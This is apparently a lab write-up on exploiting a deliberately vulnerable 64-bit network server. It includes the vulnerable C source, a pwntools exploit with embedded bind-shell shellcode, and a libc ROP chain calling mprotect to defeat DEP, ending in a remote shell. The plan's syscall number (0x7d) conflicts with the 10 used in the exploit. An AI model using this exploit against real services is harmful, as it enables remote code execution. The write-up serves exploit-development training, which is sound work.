# Remote buffer overflow with ROP - DEP/64bit

Networked server with a stack based overflow. Can be solved by using ROP
and `mprotect()` to make shellcode executable.

## Source

```
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>


void write2sock(int sock, char *str) {
        write(sock, str, strlen(str));
}


void readStrInput(int sock, int len) {
        char buffer[128];
        ssize_t ret;

        bzero(buffer, sizeof(buffer));

        dprintf(sock, "Input string: \n");
        dprintf(sock, "> ");
        fflush(stdout);
        ret = read(sock, &buffer, len);

        dprintf(sock, "I've read: %i bytes\n", ret);
}


void handleBofInput(int sock) {
        char input[16];
        int inputLen;

        dprintf(sock, "How many bytes do you want to read?\n");
        dprintf(sock, "> ");

        read(sock, input, sizeof(input) - 1);
        inputLen = atoi(input);

        if (inputLen > 0) {
                dprintf(sock, "Ok, i'll read %i bytes\n", inputLen);
                readStrInput(sock, inputLen);
        }

        dprintf(sock, "Ok, done\n");
}
[...]
```


## Step 1: Check program behaviour

Start server, and note pid:
```
root@hlUbuntu64:~/challenges/challenge16# ./challenge16 &
[1] 5880
root@hlUbuntu64:~/challenges/challenge16# Listen on port: 5001
```

You can use the pid `5880` to later attach to the process in GDB via `attach 5880`.


```
root@hlUbuntu64:~/challenges/challenge16# nc localhost 5001
Press:
  0   To quit
  1   To stack overflow
> 1
How many bytes do you want to read?
> 4
Ok, i'll read 4 bytes
Input string:
> AAAA
I've read: 4 bytes
Ok, done
```

## Step 2: basic exploit skeleton

```
#!/usr/bin/python

import struct
from pwn import *

# http://shell-storm.org/shellcode/files/shellcode-78.php
shellcode = ""
shellcode += "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
shellcode += "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
shellcode += "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
shellcode += "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
shellcode += "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
shellcode += "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
shellcode += "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
shellcode += "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";


e = ELF("./challenge16")
tube = connect("localhost", 5001)

def doBof():
        print tube.recvuntil(">")
        tube.sendline("1");

        print tube.recv()
        tube.sendline("8");

        print tube.recv()
        tube.sendline("AAAAAAAA")

        print tube.recv()


doBof()
```


## Step 3: Find offset

With trial and error, we find the correct offset to SIP: `152`

```
offset = 152

def doBof(payload):
        print tube.recvuntil("> ")
        tube.send("1");

        print tube.recv()
        tube.send(str(len(payload)));

        print tube.recv()
        tube.send(payload)

        print tube.recv()


payload = "A" * offset + "BBBB"

doBof(payload)
```

Test results in:
```
0x0000000042424242 in ?? ()
gdb-peda$
```


## Plan

Because DEP is enabled, we have to mark the memory area of the stack executable. This is
possible by using the systemcall `mprotect`:

```
int mprotect(void *addr, size_t len, int prot);

mprotect() changes the access protections for the calling process's
       memory pages containing any part of the address range in the interval
       [addr, addr+len-1].  addr must be aligned to a page boundary.
```


## Example mprotect

```
#include <stdio.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

void main(void) {
        char stackvar[16];
        int ret;
        long long stackbase = (long long)( &stackvar ) & ~(PAGE_SIZE -1); // round down

        printf("Stack var: %p\n", &stackvar);
        printf("Stackbase: 0x%llx\n", stackbase);
        ret = mprotect( (void *) stackbase, 16, PROT_READ|PROT_WRITE|PROT_EXEC);

        printf("Ret: %i\n", ret);
}
```

Test:
```
root@hlUbuntu64:~/challenges/challenge16# gcc mprotect-test.c && ./a.out
Stack var: 0x7fffffffe480
Stackbase: 0x7fffffffe000
Ret: 0
```

Call to mprotect, via disassembly:
```
0x0000000000400627 <+81>:	mov    rax,QWORD PTR [rbp-0x28]
0x000000000040062b <+85>:	mov    edx,0x7
0x0000000000400630 <+90>:	mov    esi,0x10
0x0000000000400635 <+95>:	mov    rdi,rax
0x0000000000400638 <+98>:	call   0x4004c0 <mprotect@plt>
```

With x86-64 bit function call convention: RDI, RSI, RDX

According to http://syscalls.kernelgrok.com/ sys_mprotect is syscall nr is  0x7d.
x86-64 bit system call convention is: RDI, RSI, RDX (syscall in RAX).


## ROP chain plan

We'll do the following ROP chain:

- pop RAX   // <-- SIP is here
- 0x7d      // sys_mprotect
- pop RDI
- addr      // addr of stack with shellcode
- pop RSI
- 4096      // size of stack
- pop RDX
- 0x7       // stack permissions (RWX)
- syscall
- addr of shellcode


## Find stack addr of shellcode

First, lets find the shellcode address:

```
gdb-peda$ disas readStrInput
Dump of assembler code for function readStrInput:
   0x0000000000400a68 <+0>:	push   rbp
   0x0000000000400a69 <+1>:	mov    rbp,rsp
   0x0000000000400a6c <+4>:	sub    rsp,0xa0
   0x0000000000400a73 <+11>:	mov    DWORD PTR [rbp-0x94],edi
   0x0000000000400a79 <+17>:	mov    DWORD PTR [rbp-0x98],esi
   0x0000000000400a7f <+23>:	lea    rax,[rbp-0x90]
   0x0000000000400a86 <+30>:	mov    esi,0x80
   0x0000000000400a8b <+35>:	mov    rdi,rax
   0x0000000000400a8e <+38>:	call   0x4008d0 <bzero@plt>
   0x0000000000400a93 <+43>:	mov    eax,DWORD PTR [rbp-0x94]
   0x0000000000400a99 <+49>:	mov    esi,0x400ea8
   0x0000000000400a9e <+54>:	mov    edi,eax
   0x0000000000400aa0 <+56>:	mov    eax,0x0
   0x0000000000400aa5 <+61>:	call   0x400860 <dprintf@plt>
   0x0000000000400aaa <+66>:	mov    eax,DWORD PTR [rbp-0x94]
   0x0000000000400ab0 <+72>:	mov    esi,0x400eb8
   0x0000000000400ab5 <+77>:	mov    edi,eax
   0x0000000000400ab7 <+79>:	mov    eax,0x0
   0x0000000000400abc <+84>:	call   0x400860 <dprintf@plt>
   0x0000000000400ac1 <+89>:	mov    rax,QWORD PTR [rip+0x2015f8]        # 0x6020c0 <stdout@@GLIBC_2.2.5>
   0x0000000000400ac8 <+96>:	mov    rdi,rax
   0x0000000000400acb <+99>:	call   0x400890 <fflush@plt>
   0x0000000000400ad0 <+104>:	mov    eax,DWORD PTR [rbp-0x98]
   0x0000000000400ad6 <+110>:	movsxd rdx,eax
   0x0000000000400ad9 <+113>:	lea    rcx,[rbp-0x90]
   0x0000000000400ae0 <+120>:	mov    eax,DWORD PTR [rbp-0x94]
   0x0000000000400ae6 <+126>:	mov    rsi,rcx
   0x0000000000400ae9 <+129>:	mov    edi,eax
   0x0000000000400aeb <+131>:	call   0x400870 <read@plt>
   0x0000000000400af0 <+136>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400af4 <+140>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400af8 <+144>:	mov    eax,DWORD PTR [rbp-0x94]
   0x0000000000400afe <+150>:	mov    esi,0x400ebb
   0x0000000000400b03 <+155>:	mov    edi,eax
   0x0000000000400b05 <+157>:	mov    eax,0x0
   0x0000000000400b0a <+162>:	call   0x400860 <dprintf@plt>
   0x0000000000400b0f <+167>:	nop
   0x0000000000400b10 <+168>:	leave  
   0x0000000000400b11 <+169>:	ret    
End of assembler dump.
gdb-peda$ b *readStrInput+131
Breakpoint 1 at 0x400aeb
gdb-peda$ i r rsi
rsi            0x7fffffffe1e0	0x7fffffffe1e0
gdb-peda$ x/16x $rsi
0x7fffffffe1e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe1f0:	0x0000000000000000	0x0000000000000000
0x7fffffffe200:	0x0000000000000000	0x0000000000000000
0x7fffffffe210:	0x0000000000000000	0x0000000000000000
0x7fffffffe220:	0x0000000000000000	0x0000000000000000
0x7fffffffe230:	0x0000000000000000	0x0000000000000000
0x7fffffffe240:	0x0000000000000000	0x0000000000000000
0x7fffffffe250:	0x0000000000000000	0x0000000000000000
gdb-peda$ n
0x0000000000400af0 in readStrInput ()
gdb-peda$ x/16x $rsi
0x7fffffffe1e0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe1e8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```

Therefore, our stack address is `0x7fffffffe1e0`


## Find gadgets

We need five gadgets:
- pop RAX
- pop RDI
- pop RSI
- pop RDX
- syscall

Check libraries the binary uses:
```
root@hlUbuntu64:~/challenges/challenge16# ldd challenge16
	linux-vdso.so.1 =>  (0x00007ffff7ffd000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c2b000)
	/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
```

Check libc for gadgets:
```
root@hlUbuntu64:~/challenges/challenge16# ropper
(ropper)> type rop
(ropper)> file /lib/x86_64-linux-gnu/libc.so.6
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.

(libc.so.6/ELF/x86_64)> search /1/ pop rax
[INFO] Searching for gadgets: pop rax

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x0000000000018ec8: pop rax; ret 0x18;
0x000000000003a718: pop rax; ret;

(libc.so.6/ELF/x86_64)> search /1/ pop rdi
[INFO] Searching for gadgets: pop rdi

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x0000000000067449: pop rdi; ret 0xffff;
0x00000000000f1c2b: pop rdi; ret 9;
0x0000000000021102: pop rdi; ret;

(libc.so.6/ELF/x86_64)> search /1/ pop rsi
[INFO] Searching for gadgets: pop rsi

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x00000000001014fb: pop rsi; ret 0xcdbb;
0x00000000000202e8: pop rsi; ret;

(libc.so.6/ELF/x86_64)> search /1/ pop rdx
[INFO] Searching for gadgets: pop rdx

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x0000000000001b92: pop rdx; ret;

(libc.so.6/ELF/x86_64)> search /1/ syscall
[INFO] Searching for gadgets: syscall

[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
0x00000000000bb945: syscall; ret;

```

We'll take the following gadgets:
* 0x000000000003a718: pop rax; ret;
* 0x0000000000021102: pop rdi; ret;
* 0x00000000000202e8: pop rsi; ret;
* 0x0000000000001b92: pop rdx; ret;
* 0x00000000000bb945: syscall; ret;

Lets check where libc is mapped into:
```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00402000         r-xp	/root/challenges/challenge16/challenge16
0x00601000         0x00602000         r--p	/root/challenges/challenge16/challenge16
0x00602000         0x00603000         rw-p	/root/challenges/challenge16/challenge16
0x00603000         0x00624000         rw-p	[heap]
0x00007ffff7a0e000 0x00007ffff7bce000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
[...]
```

The libc base address is `0x00007ffff7a0e000`.

Lets double check it with a gadget:
```
gdb-peda$ x/2i 0x00007ffff7a0e000+0x000000000003a718
   0x7ffff7a48718 <mblen+104>:	pop    rax
   0x7ffff7a48719 <mblen+105>:	ret   
```

Seems alright!

## Updated exploit

We use the following ROP chain:
```
# shellcode
payload = shellcode
payload += "A" * (offset - len(shellcode))

# rop
payload += p64 ( libcBase + 0x000000000003a718 )        # 0x000000000003a718: pop rax; ret;
payload += p64 ( 10 )                   # syscall sys_mprotect

payload += p64 ( libcBase + 0x0000000000021102 )        # 0x0000000000021102: pop rdi; ret;
payload += p64 ( stackAddr )            # mprotect arg: addr

payload += p64 ( libcBase + 0x00000000000202e8 )        # 0x00000000000202e8: pop rsi; ret;
payload += p64 ( 4096 )                 # mprotect arg: size

payload += p64 ( libcBase + 0x0000000000001b92)         # 0x0000000000001b92: pop rdx; ret;
payload += p64 ( 0x7 )                  # protect arg: permissions

payload += p64 ( libcBase + 0x00000000000bb945) # 0x00000000000bb945: syscall; ret;

payload += p64 ( shellcodeAddr )
```

## Result

```
root@hlUbuntu64:~/challenges/challenge16# python exp-challenge16.py
[*] '/root/challenges/challenge16/challenge16'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to localhost on port 5001: Done
Shellcode len: 131
Stack addr: 0x7fffffffe000
Shellcode:  0x7fffffffe1e0
Press:
  0   To quit
  1   To stack overflow
>
How many bytes do you want to read?

>
Ok, i'll read 232 bytes
Input string:
>
[+] Opening connection to localhost on port 4444: Done
[*] Switching to interactive mode
$ ls
Makefile
a.out
challenge16
challenge16.c
exp-challenge16.py
mprotect
mprotect-test.c
peda-session-challenge16.txt
peda-session-dash.txt
```
